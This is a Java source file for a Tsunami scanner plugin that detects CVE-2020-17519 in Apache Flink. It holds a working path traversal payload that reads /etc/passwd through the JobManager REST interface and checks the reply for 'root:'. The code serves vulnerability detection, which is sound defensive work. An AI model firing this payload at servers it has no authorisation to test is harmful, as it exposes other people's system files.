package com.google.tsunami.plugins.detectors.rce.cve202017519;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.*;

import javax.inject.Inject;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;

import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

/** A {@link VulnDetector} that detects the CVE-2020-17519 vulnerability. */

@PluginInfo(
        type = PluginType.VULN_DETECTION,
        name = "FlinkCVE202017519VulnDector",
        version = "1.0",
        description =
                "Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) allows attackers to read any file on the local filesystem of the JobManager" +
                " through the REST interface of the JobManager process. \n",
        author = "jingpeng (592426860@qq.com)",
        bootstrapModule = FlinkCVE202017519VulnDectorBootstarpModule.class)
public class FlinkCVE202017519VulnDector implements VulnDetector {

    private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
    private static final String CHECK_VUL_PATH = "jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd";
    @VisibleForTesting static final String DETECTION_STRING = "root:";


    private final Clock utcClock;
    private final HttpClient httpClient;

    @Inject
    FlinkCVE202017519VulnDector(@UtcClock Clock utcClock, HttpClient httpClient) {
        this.utcClock = utcClock;
        this.httpClient = httpClient;
    }

    @Override
    public DetectionReportList detect(TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
        logger.atInfo().log("CVE-2020-17519 starts detecting.");

        return DetectionReportList.newBuilder()
                .addAllDetectionReports(
                        matchedServices.stream()
                                .filter(NetworkServiceUtils::isWebService)
                                .filter(this::isServiceVulnerable)
                                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                                .collect(toImmutableList()))
                .build();
    }



    private boolean isServiceVulnerable(NetworkService networkService) {
        String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + CHECK_VUL_PATH;
        try {
            HttpResponse httpResponse =
                    httpClient.send(
                            get(targetUri)
                                    .setHeaders(HttpHeaders.builder()
                                            //.addHeader(USER_AGENT, "Nacos-Server")
                                            .build())
                                    .build(),
                            networkService);

            if (httpResponse.status().code() == 200
                    && httpResponse.bodyString().get().contains(DETECTION_STRING)) {
                return true;
            }

        } catch (IOException e) {
            logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
            return false;
        }
        return false;
    }

    private DetectionReport buildDetectionReport(
            TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
        return DetectionReport.newBuilder()
                .setTargetInfo(targetInfo)
                .setNetworkService(vulnerableNetworkService)
                .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
                .setVulnerability(
                        Vulnerability.newBuilder()
                            .setMainId(
                                    VulnerabilityId.newBuilder()
                                            .setPublisher("TSUNAMI_COMMUNITY")
                                            .setValue("CVE_2020_17519"))
                            .setSeverity(Severity.CRITICAL)
                            .setTitle("CVE-2020-17519 read files through the REST interface of the JobManager process")
                            .setDescription("Apache Flink 1.11.0 (and released in 1.11.1 and 1.11.2 as well) " +
                                    "allows attackers to read any file on the local filesystem of the JobManager" +
                                    " through the REST interface of the JobManager process.")
                            .setRecommendation("All users should upgrade to Flink 1.11.3 or 1.12.0 if their Flink instance(s) are exposed." +
                                    " The issue was fixed in commit b561010b0ee741543c3953306037f00d7a9f0801 from apache/flink:master.")
                ).build();
    }
}
